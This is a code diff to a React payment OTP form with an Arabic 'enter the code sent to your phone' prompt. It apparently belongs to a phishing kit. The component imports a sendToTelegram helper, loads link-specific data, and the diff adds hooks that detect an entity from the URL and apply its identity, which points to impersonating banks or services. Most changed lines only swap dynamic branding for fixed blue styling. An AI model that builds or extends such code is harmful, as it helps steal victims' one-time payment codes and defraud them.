@@ -9,12 +9,18 @@ import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { detectEntityFromURL, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
   
   const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [attempts, setAttempts] = useState(0);
@@ -261,24 +267,24 @@ const PaymentOTPForm = () => {
     >
       {/* Title Section */}
       <div className="text-center mb-6 sm:mb-8">
-        <div 
+        <div
           className="w-16 h-16 sm:w-20 sm:h-20 rounded-full mx-auto mb-4 flex items-center justify-center animate-pulse shadow-lg"
           style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: `linear-gradient(135deg, #2563eb, #3b82f6)`
           }}
         >
           <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-white" />
         </div>
         <h1 className="text-2xl sm:text-3xl font-bold mb-2">رمز التحقق</h1>
-        <p className="text-sm sm:text-base text-muted-foreground">أدخل الرمز المرسل إلى هاتفك</p>
+        <p className="text-sm sm:text-base text-gray-600">أدخل الرمز المرسل إلى هاتفك</p>
       </div>
 
       {/* Info */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6"
+      <div
+        className="rounded-lg p-3 sm:p-4 mb-6 border"
         style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
+          backgroundColor: '#dbeafe',
+          borderColor: '#93c5fd'
         }}
       >
         <p className="text-xs sm:text-sm text-center">
@@ -302,11 +308,9 @@ const PaymentOTPForm = () => {
                 onChange={(e) => handleChange(index, e.target.value)}
                 onKeyDown={(e) => handleKeyDown(index, e)}
                 onPaste={handlePaste}
-                className="w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all"
-                style={{
-                  borderColor: digit ? branding.colors.primary : undefined,
-                  backgroundColor: digit ? `${branding.colors.primary}08` : undefined
-                }}
+                className={`w-12 h-14 sm:w-16 sm:h-20 text-center text-xl sm:text-3xl font-bold border-2 rounded-xl transition-all ${
+                  digit ? 'border-blue-600 bg-blue-50' : 'border-gray-300'
+                }`}
                 disabled={attempts >= 3}
                 autoComplete="off"
               />
@@ -346,12 +350,14 @@ const PaymentOTPForm = () => {
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+          className={`w-full text-sm sm:text-lg py-5 sm:py-7 text-white ${
+            attempts >= 3 ? 'bg-gray-600' : ''
+          }`}
           disabled={attempts >= 3 || !isOtpComplete}
           style={{
-            background: attempts >= 3 
-              ? '#666' 
-              : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+            background: attempts >= 3
+              ? '#666'
+              : `linear-gradient(135deg, #2563eb, #3b82f6)`
           }}
         >
           {attempts >= 3 ? (
@@ -368,8 +374,7 @@ const PaymentOTPForm = () => {
           <Button
             type="button"
             variant="ghost"
-            className="w-full mt-3"
-            style={{ color: branding.colors.primary }}
+            className="w-full mt-3 text-blue-600 hover:text-blue-700 hover:bg-blue-50"
             onClick={() => {
               setCountdown(60);
               toast({
